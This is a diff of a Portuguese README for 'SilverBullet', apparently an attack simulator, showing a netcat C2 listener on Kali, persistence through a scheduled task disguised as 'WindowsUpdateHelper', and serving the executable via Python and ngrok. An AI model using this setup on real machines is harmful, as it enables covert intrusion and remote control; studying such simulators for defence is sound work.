@@ -103,14 +103,12 @@ var config = Config{
 
 ### Servidor C2 (Kali Linux)
 
-```bash
 # Receptor TCP compatível com o simulador
 nc -lvnp 9443
 ```
 
 ### Execução no Windows
 
-```bash
 # Execução normal — inicia todas as 4 fases
 SilverBullet.exe
 
@@ -127,9 +125,6 @@ Fase 2 — Persistência    Cria tarefa agendada "WindowsUpdateHelper"
 Fase 3 — C2              Conecta ao servidor e aguarda comandos
 ```
 
-### Download para demonstração (ngrok)
-
-```bash
 # No Kali — serve o .exe para download na máquina Windows podem ser utilizados o Python ou o Ngrok:
 python3 -m http.server 8080
 ngrok http 8080
